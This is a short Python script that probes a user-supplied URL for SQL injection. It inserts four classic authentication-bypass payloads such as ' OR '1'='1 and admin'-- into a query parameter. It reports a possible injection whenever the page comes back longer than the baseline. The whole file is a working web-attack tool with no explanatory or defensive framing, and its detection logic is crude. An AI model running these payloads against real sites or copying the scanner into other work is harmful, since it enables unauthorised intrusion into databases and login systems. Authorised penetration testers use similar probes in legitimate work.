#!/usr/bin/env python3
import os, sys, requests
url = os.getenv('ARG_URL', '')
if not url:
    print('[!] URL required')
    sys.exit(1)

payloads = ["' OR '1'='1", "1' OR 1=1--", "admin'--", "' OR 'a'='a"]
print(f'[*] Testing {url} for SQL injection...')
for p in payloads:
    try:
        test_url = url.replace('VALUE', p) if 'VALUE' in url else f'{url}?id={p}'
        r = requests.get(test_url, timeout=5)
        if len(r.text) > len(requests.get(url, timeout=5).text):
            print(f'[!] Possible SQL injection: {p}')
    except:
        pass
print('[+] Test completed')
